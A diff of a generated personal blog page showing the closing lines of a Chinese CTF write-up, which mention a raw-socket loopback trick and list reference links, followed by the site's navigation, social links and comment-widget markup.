-<svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z"/></svg></a>
-</div>
-<div>
-</div>
-<hr>
-<div class=pb-2>
-<div id=disqus_thread></div>
-<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//amiaaaz.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
-<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
-<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
-</div>
-<hr>
-</footer>
-<script src=/dist/app.js></script>
+Because this script uses raw sockets to send and receive the &ldquo;localhost&rdquo; packets, it works fine inside a normal unprivileged container.</p></blockquote><p>因为需要nc 所以另开一个shell</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729153443403.png alt=image-20210729153443403></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729153501930.png alt=image-20210729153501930></p><p>参考：<a href="https://jan.show/?p=128">wp</a> | <a href=https://www.zhihu.com/question/49866806>为什么整个127.*网段都被拿来当做环回地址了？</a></p><hr><p>本人比较菜，只做出来了签到题和几个web，其余均为赛后复盘，<a href=https://mp.weixin.qq.com/s/SQ-DGvug-P6PK-s3qkJVdw>此处是参考wp</a></p><p>道阻且长呀，暑假要好好努力咯 (つд⊂)
+参照一些教程把简单的博客也搭起来了，以后要把这个小窝慢慢丰富起来(ゝ∀･)☆</p></div></section></article></main><div class="w-full h-0 flex-none order-3"></div><aside role=contentinfo class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl"><div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2"><div class="md:max-w-xs flex flex-col md:items-end"><ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col"><li class="px-1 md:px-0"><a href=/posts/ title="Posts page">Posts</a></li><li class="px-1 md:px-0"><a href=/relax/ title="Relaxxx page">Relaxxx</a></li><li class="px-1 md:px-0"><a href=/categories/ title="Categories page">Categories</a></li><li class="px-1 md:px-0"><a href=/tags/ title="Tags page">Tags</a></li><li class="px-1 md:px-0"><a href=/series/ title="Series page">Series</a></li><li class="px-1 md:px-0"><a href=/about/ title="About page">About</a></li><li class="px-1 md:px-0"><a href=/friends/ title="Friends page">Friends</a></li><div id=fastSearch class=m-0><input id=searchInput type=text size=10 class="bg-gray-100 focus:outline-none border-b border-gray-100 focus:border-eucalyptus-300 md:text-right
+placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search><ul id=searchResults class="bg-gray-200 px-2 divide-y divide-gray-400"></ul></div></ul><div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start md:flex-col max-h-16"><a href=https://space.bilibili.com/1651059195 target=_blank class="bilibili icon pl-1 text-eucalyptus-400 hover:text-java-400" title="bilibili link" rel=noopener aria-label="follow on bilibili——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M7.172 2.757 10.414 6h3.171l3.243-3.242a1 1 0 011.415 1.415L16.414 6H18.5A3.5 3.5.0 0122 9.5v8A3.5 3.5.0 0118.5 21h-13A3.5 3.5.0 012 17.5v-8A3.5 3.5.0 015.5 6h2.085L5.757 4.171a1 1 0 011.415-1.415zM18.5 8h-13A1.5 1.5.0 004.007 9.356L4 9.5v8a1.5 1.5.0 001.356 1.493L5.5 19h13a1.5 1.5.0 001.493-1.356L20 17.5v-8A1.5 1.5.0 0018.5 8zM8 11a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1zm8 0a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1z"/></g></svg></div></a><a href=https://github.com/AmiaaaZ target=_blank class="github icon pl-1 text-eucalyptus-400 hover:text-java-400" title="github link" rel=noopener aria-label="follow on github——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M5.883 18.653c-.3-.2-.558-.455-.86-.816a50.32 50.32.0 01-.466-.579c-.463-.575-.755-.84-1.057-.949a1 1 0 01.676-1.883c.752.27 1.261.735 1.947 1.588-.094-.117.34.427.433.539.19.227.33.365.44.438.204.137.587.196 1.15.14.023-.382.094-.753.202-1.095C5.38 15.31 3.7 13.396 3.7 9.64c0-1.24.37-2.356 1.058-3.292-.218-.894-.185-1.975.302-3.192a1 1 0 01.63-.582c.081-.024.127-.035.208-.047.803-.123 1.937.17 3.415 1.096A11.731 11.731.0 0112 3.315c.912.0 1.818.104 2.684.308 1.477-.933 2.613-1.226 3.422-1.096.085.013.157.03.218.05a1 1 0 01.616.58c.487 1.216.52 2.297.302 3.19.691.936 1.058 2.045 1.058 3.293.0 3.757-1.674 5.665-4.642 6.392.125.415.19.879.19 1.38a300.492 300.492.0 01-.012 2.716 1 1 0 01-.019 1.958c-1.139.228-1.983-.532-1.983-1.525l.002-.446.005-.705c.005-.708.007-1.338.007-1.998.0-.697-.183-1.152-.425-1.36-.661-.57-.326-1.655.54-1.752 2.967-.333 4.337-1.482 4.337-4.66.0-.955-.312-1.744-.913-2.404a1 1 0 01-.19-1.045c.166-.414.237-.957.096-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 01-.833.135A9.626 9.626.0 0012 5.315c-.89.0-1.772.119-2.592.35a1 1 0 01-.83-.134c-.752-.507-1.374-.807-1.868-.947-.144.653-.073 1.194.092 1.607a1 1 0 01-.189 1.045C6.016 7.89 5.7 8.694 5.7 9.64c0 3.172 1.371 4.328 4.322 4.66.865.097 1.201 1.177.544 1.748-.192.168-.429.732-.429 1.364v3.15c0 .986-.835 1.725-1.96 1.528a1 1 0 01-.04-1.962v-.99c-.91.061-1.662-.088-2.254-.485z"/></g></svg></div></a><a href=vickyckyky@foxmail.com target=_blank class="mail icon pl-1 text-eucalyptus-400 hover:text-java-400" title="mail link" rel=noopener aria-label="follow on mail——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M3 3h18a1 1 0 011 1v16a1 1 0 01-1 1H3a1 1 0 01-1-1V4a1 1 0 011-1zm17 4.238-7.928 7.1L4 7.216V19h16V7.238zM4.511 5l7.55 6.662L19.502 5H4.511z"/></g></svg></div></a><a href=354c3267364c2b5a354c6d49354c7147364b656a356f69523737794d354c69413561366136494f393534796335596977355a436e37377966 target=_blank class="netease-cloud-music icon pl-1 text-eucalyptus-400 hover:text-java-400" title="netease-cloud-music link" rel=noopener aria-label="follow on netease-cloud-music——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M10.421 11.375c-.294 1.028.012 2.064.784 2.653 1.061.81 2.565.3 2.874-.995.08-.337.103-.722.027-1.056-.23-1.001-.52-1.988-.792-2.996-1.33.154-2.543 1.172-2.893 2.394zm5.548-.287c.273 1.012.285 2.017-.127 3-1.128 2.69-4.721 3.14-6.573.826-1.302-1.627-1.28-3.961.06-5.734.78-1.032 1.804-1.707 3.048-2.054l.379-.104c-.084-.415-.188-.816-.243-1.224-.176-1.317.512-2.503 1.744-3.04 1.226-.535 2.708-.216 3.53.76.406.479.395 1.08-.025 1.464-.412.377-.996.346-1.435-.09-.247-.246-.51-.44-.877-.436-.525.006-.987.418-.945.937.037.468.173.93.3 1.386.022.078.216.135.338.153 1.334.197 2.504.731 3.472 1.676 2.558 2.493 2.861 6.531.672 9.44-1.529 2.032-3.61 3.168-6.127 3.409-4.621.44-8.664-2.53-9.7-7.058C2.515 10.255 4.84 5.831 8.795 4.25c.586-.234 1.143-.031 1.371.498.232.537-.019 1.086-.61 1.35-2.368 1.06-3.817 2.855-4.215 5.424-.533 3.433 1.656 6.776 5 7.72 2.723.77 5.658-.166 7.308-2.33 1.586-2.08 1.4-5.099-.427-6.873a3.979 3.979.0 00-1.823-1.013c.198.716.389 1.388.57 2.062z"/></g></svg></div></a><a href=2517834528 target=_blank class="qq icon pl-1 text-eucalyptus-400 hover:text-java-400" title="qq link" rel=noopener aria-label="follow on qq——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M17.535 12.514l-.696-1.796c0-.021.01-.375.01-.558C16.848 7.088 15.446 4 12 4s-4.848 3.088-4.848 6.16c0 .183.009.537.01.558l-.696 1.796c-.19.515-.38 1.05-.517 1.51-.657 2.189-.444 3.095-.282 3.115.348.043 1.354-1.648 1.354-1.648.0.98.488 2.258 1.542 3.18-.394.127-.878.32-1.188.557-.28.214-.245.431-.194.52.22.385 3.79.245 4.82.125 1.03.12 4.599.26 4.82-.126.05-.088.085-.305-.194-.519-.311-.237-.795-.43-1.19-.556 1.055-.923 1.542-2.202 1.542-3.181.0.0 1.007 1.691 1.355 1.648.162-.02.378-.928-.283-3.116-.14-.463-.325-.994-.516-1.509zm1.021 8.227c-.373.652-.833.892-1.438 1.057-.24.065-.498.108-.794.138-.44.045-.986.065-1.613.064a33.23 33.23.0 01-2.71-.116c-.692.065-1.785.114-2.71.116a16.07 16.07.0 01-1.614-.064 4.928 4.928.0 01-.793-.138c-.605-.164-1.065-.405-1.44-1.059a2.274 2.274.0 01-.239-1.652c-.592-.132-1.001-.483-1.279-.911a2.43 2.43.0 01-.309-.71 4.028 4.028.0 01-.116-1.106c.013-.785.187-1.762.532-2.912.14-.466.327-1.008.568-1.655l.553-1.43a15.496 15.496.0 01-.002-.203C5.152 5.605 7.588 2 12 2c4.413.0 6.848 3.605 6.848 8.16l-.001.203.553 1.43.01.026c.225.606.413 1.153.556 1.626.348 1.15.522 2.129.535 2.916.007.407-.03.776-.118 1.108-.066.246-.161.48-.31.708-.276.427-.684.776-1.277.91.13.554.055 1.14-.24 1.654z"/></g></svg></div></a><a href=vickyckyky target=_blank class="wechat icon pl-1 text-eucalyptus-400 hover:text-java-400" title="wechat link" rel=noopener aria-label="follow on wechat——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g fill-rule="evenodd"><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M10 14.676v-.062c0-2.508 2.016-4.618 4.753-5.233C14.389 7.079 11.959 5.2 8.9 5.2 5.58 5.2 3 7.413 3 9.98c0 .969.36 1.9 1.04 2.698.032.038.083.094.152.165a3.568 3.568.0 011.002 2.238 3.612 3.612.0 012.363-.442c.166.026.302.046.405.06A7.254 7.254.0 0010 14.675zm.457 1.951a9.209 9.209.0 01-2.753.055 19.056 19.056.0 01-.454-.067 1.612 1.612.0 00-1.08.212l-1.904 1.148a.806.806.0 01-.49.117.791.791.0 01-.729-.851l.15-1.781a1.565 1.565.0 00-.439-1.223 5.537 5.537.0 01-.241-.262C1.563 12.855 1 11.473 1 9.979 1 6.235 4.537 3.2 8.9 3.2c4.06.0 7.403 2.627 7.85 6.008 3.372.153 6.05 2.515 6.05 5.406.0 1.193-.456 2.296-1.229 3.19-.051.06-.116.13-.195.21a1.24 1.24.0 00-.356.976l.121 1.423a.635.635.0 01-.59.68.66.66.0 01-.397-.094l-1.543-.917a1.322 1.322.0 00-.874-.169c-.147.023-.27.04-.368.053-.316.04-.64.062-.969.062-2.694.0-4.998-1.408-5.943-3.401zm6.977 1.31a3.325 3.325.0 011.676.174 3.25 3.25.0 01.841-1.502c.05-.05.087-.09.106-.112.489-.565.743-1.213.743-1.883.0-1.804-1.903-3.414-4.4-3.414-2.497.0-4.4 1.61-4.4 3.414s1.903 3.414 4.4 3.414c.241.0.48-.016.714-.046.08-.01.188-.025.32-.046z"/></g></svg></div></a><a href=https://weibo.com/u/3337203335203336203332203334203333203334203331203331203332 target=_blank class="weibo icon pl-1 text-eucalyptus-400 hover:text-java-400" title="weibo link" rel=noopener aria-label="follow on weibo——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M20.194 14.197c0 3.362-4.53 6.424-9.926 6.424C5.318 20.62 1 18.189 1 14.534c0-1.947 1.18-4.087 3.24-6.088 2.832-2.746 6.229-4.033 7.858-2.448.498.482.723 1.122.719 1.858 1.975-.576 3.65-.404 4.483.752.449.623.532 1.38.326 2.207 1.511.61 2.568 1.77 2.568 3.382zm-4.44-2.07c-.386-.41-.4-.92-.198-1.41.208-.508.213-.812.12-.94-.264-.368-1.533-.363-3.194.311a2.043 2.043.0 01-.509.14c-.344.046-.671.001-.983-.265-.419-.359-.474-.855-.322-1.316.215-.67.18-1.076.037-1.215-.186-.18-.777-.191-1.659.143-1.069.405-2.298 1.224-3.414 2.306C3.925 11.54 3 13.218 3 14.534c0 2.242 3.276 4.087 7.268 4.087 4.42.0 7.926-2.37 7.926-4.424.0-.738-.637-1.339-1.673-1.652-.394-.113-.536-.171-.767-.417zm7.054-1.617a1 1 0 01-1.936-.502 4 4 0 00-4.693-4.924 1 1 0 11-.407-1.958 6 6 0 017.036 7.384z"/></g></svg></div></a><a href=https://www.zhihu.com/people/lan-shan-86-69 target=_blank class="zhihu icon pl-1 text-eucalyptus-400 hover:text-java-400" title="zhihu link" rel=noopener aria-label="follow on zhihu——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M12.344 17.963l-1.688 1.074-2.131-3.35c-.44 1.402-1.172 2.665-2.139 3.825-.402.483-.82.918-1.301 1.375-.155.147-.775.717-.878.82l-1.414-1.414c.139-.139.787-.735.915-.856.43-.408.795-.79 1.142-1.206 1.266-1.518 2.03-3.21 2.137-5.231H3v-2h4V7h-.868c-.689 1.266-1.558 2.222-2.618 2.857L2.486 8.143c1.395-.838 2.425-2.604 3.038-5.36l1.952.434c-.14.633-.303 1.227-.489 1.783H11.5v2H9v4h2.5v2H9.185l3.159 4.963zm3.838-.07L17.298 17H19V7h-4v10h.736l.446.893zM13 5h8v14h-3l-2.5 2-1-2H13V5z"/></g></svg></div></a></div><div class="text-sm text-gray-500 leading-tight a-gray"><br>Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 4627 words in this page.</div></div></div></aside><footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2"><hr class=double-line><div class="flex flex-wrap justify-between pb-2 leading-loose font-serif"><a class=flex-grow-0 href=/friends/><svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z"/></svg>Friends</a>
+<a class=flex-grow-0 href=/2021/08/05/dasctf0721-wp/>DasCTF0721 Wp<svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z"/></svg></a></div><div></div><hr><div class=pb-2><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//amiaaaz.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><hr></footer><script src=/dist/app.js></script>
 <script src=/lib/fuse.min.js></script>
-<script src=/lib/fastsearch.js></script>
-</div>
-</body>
-</html>
+<script src=/lib/fastsearch.js></script></div></body></html>
